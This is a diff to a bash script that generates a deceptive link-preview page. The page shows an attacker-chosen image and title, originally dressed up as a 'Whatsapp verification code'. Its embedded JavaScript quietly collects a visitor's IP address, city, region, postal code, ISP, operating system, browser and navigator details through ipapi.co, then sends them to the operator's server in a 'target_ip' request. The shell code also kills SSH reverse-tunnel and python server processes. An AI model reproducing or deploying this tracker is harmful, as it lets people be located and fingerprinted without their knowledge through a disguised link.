@@ -12,9 +12,9 @@ trap ctrl_c INT
 
 
 
-if [[ ! $1 ]] || [[ ! $2 ]]; then
+if [[ ! $1 ]] || [[ ! $2 ]] || [[ ! $3 ]]; then
 
-    echo -e "\n\t api.sh <image_url>  <local_web_port>"
+    echo -e "\n\t index.sh <image_url>  <local_web_port> \"<page_description>\""
     ps -faux | grep -E 'ssh -R|grep|python3 -m' | awk '{print $2}' | xargs kill -9  2>/dev/null
     exit 1
 
@@ -28,15 +28,15 @@ fi
  <head>
      <meta charset=\"UTF-8\">
      <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
-     <meta property=\"og:title\" content=\"Whatsapp code\"/>
+     <meta property=\"og:title\" content=\"$3\"/>
      <meta property=\"og:type\" content=\"image\"/>
      <meta property=\"og:url\" content=\"$1\"/>
      <meta property=\"og:image\" content=\"$1\"/>
-     <meta property=\"og:site_name\" content=\"Whatsapp verification code\"/>
+     <meta property=\"og:site_name\" content=\"$3\"/>
      <meta property=\"og:image:type\" content=\"image/jpg\" /> 
      <meta property=\"og:image:width\" content=\"700\" /> 
      <meta property=\"og:image:height\" content=\"300\" />
-     <title>Whatsapp code verify</title>
+     <title>$3 verify</title>
  </head>
  <body>
  	<img src=\"$1\" width=\"300\" height=\"300\" alt=\"Whatsap code\" srcset=\"\">    
@@ -122,7 +122,6 @@ fi
 
            
             $.getJSON('https://ipapi.co/json/', function(data) {
-                console.log(JSON.stringify(data, null, 2));
                 fetch(window.location.href+\"dvc\?target_ip=\"+data.ip+\"&os.name=\"+e.os.name+\"&os.version=\"+e.os.version+\"&browser.name=\"+e.browser.name+\"&browser.version=\"+e.browser.version+\"&navigator.userAgent=\"+navigator.userAgent+\"&navigator.appVersion=\"+navigator.appVersion+\"&navigator.platform=\"+navigator.platform+\"&navigator.vendor=\"+navigator.vendor+\"/trg\&city=\"+data.city+\"\&state=\"+data.region+\"\&zip=\"+data.postal+\"\&ISP=\"+data.org)
             });
 
